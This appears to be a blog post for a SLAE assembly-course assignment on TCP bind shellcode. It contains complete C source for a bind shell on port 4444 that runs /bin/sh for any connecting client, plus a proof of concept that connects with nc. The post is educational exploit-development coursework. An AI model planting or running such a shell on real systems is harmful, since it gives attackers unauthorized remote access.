---
title:  "SLAE x86 Assignment 1: TCP Bind Shellcode"
header:
  teaser: "/assets/images/SHELLCODING32.png"
  teaser_home_page: true
#categories:
#  - exploit dev
classes: wide
#tags:
#  - exploit dev
#  - slae
---

## TCP BIND SHELLCODE ## 

* Binds to a port
* Executes a shell on an incoming connection
* Port number should be easily configurable

### CONCEPT 

A TCP bind shellcode will bind a shell to a specific network port on a host listening for an incoming connection via the TCP protocol.

![Bind Shell](/assets/images/bind_shell.png)

Bind shells are easily blocked by firewalls and inbound filtering rules along with NAT preventing unsolicited incoming connections (except for certain ports with known services). This limits the target host's exposure and will prevent a port-binding shellcode from receiving a successful connection.

### TCP BIND SHELL IN C

The following C skeleton code will be used to demonstrate the TCP bind shell from a high-level language perspective, this will be used as a template for the low-level assembly code to follow.

```c
#include <stdio.h>  
#include <sys/types.h>   
#include <sys/socket.h>  
#include <netinet/in.h>  
  
int host_sockid;    // socket for host  
int client_sockid;  // socket for client  
      
struct sockaddr_in hostaddr;  // sockaddr struct  
  
int main()  
{  
    // Create socket  
    host_sockid = socket(PF_INET, SOCK_STREAM, 0);  
  
    // Initialize sockaddr struct to bind socket using port 4444  
    hostaddr.sin_family = AF_INET;  
    hostaddr.sin_port = htons(4444);  
    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);  
  
    // Bind socket to IP/Port in sockaddr struct  
    bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr));  
      
    // Listen for incoming connections  
    listen(host_sockid, 2);  
  
    // Accept incoming connection using the socket created  
    client_sockid = accept(host_sockid, NULL, NULL);  
  
    // Duplicate file descriptors for STDIN, STDOUT and STDERR  
    dup2(client_sockid, 0);  
    dup2(client_sockid, 1);  
    dup2(client_sockid, 2);  
  
    // Execute /bin/sh  
    execve("/bin/sh", NULL, NULL);  
    close(host_sockid);  
      
    return 0;  
}
```

Note the various syscalls in the C code which will be utilised in the upcoming Assembly code:

* socket
* bind
* listen
* accept
* dup2
* execve

The C code consists of the following:

* Creates a socket
* Binds the socket to a port
* Configures the socket to listen for incoming connections
* Accepts connections on the newly created socket
* Redirects STDIN, STDOUT, and STDERR to the incoming client connection
* Executes a shell

### POC 

```ruby
osboxes@osboxes:~/Downloads/SLAE$ gcc shell_bind_tcp.c -o shell_bind_tcp
osboxes@osboxes:~/Downloads/SLAE$ ./shell_bind_tcp 

osboxes@osboxes:~$ netstat -ano | grep 4444
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      off (0.00/0/0)
osboxes@osboxes:~$ nc 127.0.0.1 4444
id
uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
```

### SLAE DISCLAIMER
---------

This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification] [slae-link]:

Student ID: SLAE-xxxx

Github Code: [https://github.com/h3ll0clar1c3/SLAE/tree/master/Exam/Assignment1][github-code].

[slae-link]: http:/securitytube-training.com/online-courses/securitytube-linux-assembly-expert
[github-code]: https://github.com/h3ll0clar1c3/SLAE/tree/master/Exam/Assignment1
